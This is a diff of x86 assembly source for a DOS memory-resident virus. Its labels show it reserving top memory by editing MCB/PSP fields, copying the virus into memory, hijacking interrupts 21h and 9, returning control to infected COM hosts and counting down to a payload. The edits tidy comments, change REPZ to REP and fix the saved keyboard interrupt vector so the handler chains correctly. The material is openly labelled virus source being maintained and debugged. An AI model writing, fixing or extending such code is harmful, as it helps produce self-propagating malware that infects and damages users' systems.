@@ -91,9 +91,9 @@ check_if_current_mcb_is_last:
 
 decrease_free_memory:
 
-      MOV  AX, [DI+3]                             ; length of the MCB; the end is the top of memory
+      MOV  AX, [DI+3]                             ; size of memory block in paragraphs; the end address of this block is the top of memory
       SUB  AX, k_resident_memory_paragraphs       ; reserve memory
-      SUB  WORD [DI+12h], k_resident_memory_paragraphs
+      SUB  WORD [DI+12h], k_resident_memory_paragraphs ; PSP = MCB+10h → MCB+12h = PSP+2 = address of new top of memory
       MOV  [DI+3], AX                             ; decrease the memory available
       INC  BX
       ADD  AX, BX
@@ -105,8 +105,7 @@ copy_virus_to_memory:
       POP  DS
       MOV  CX, virus_end_in_file-virus_begin
       ADD  SI, 100h
-      REPZ
-      MOVSB
+      REP  MOVSB
 
       SUB  AX, 10h                                ; indirect jump to hijack_interrupts
       PUSH AX
@@ -152,7 +151,7 @@ return_to_host_from_com:
       MOV  DI, 100h
       MOV  BX, DI
       MOV  CX, 4
-      REPZ MOVSW
+      REP  MOVSW
       POP  AX
       PUSH ES
       PUSH ES
@@ -523,7 +522,7 @@ int_9_handler:
       OR   BYTE [CS:v_flags-vars_base], k_flag_activate_payload
 dont_activate_payload_yet:
       DEC  WORD [CS:r_payload_activation_counter-vars_base]
-      JMP  FAR [CS:r_int_6-vars_base]
+      JMP  FAR [CS:r_int_9-vars_base]
 
 ;-------------------------------------------------------------------------------
 ; VIRUS VARIABLES
@@ -572,7 +571,7 @@ r_date:                       dw 0
 r_time:                       dw 0
 
 r_int_21:                     dd 0
-r_int_6:                      dd 0
+r_int_9:                      dd 0
 
 r_filename:                   dd 0
 
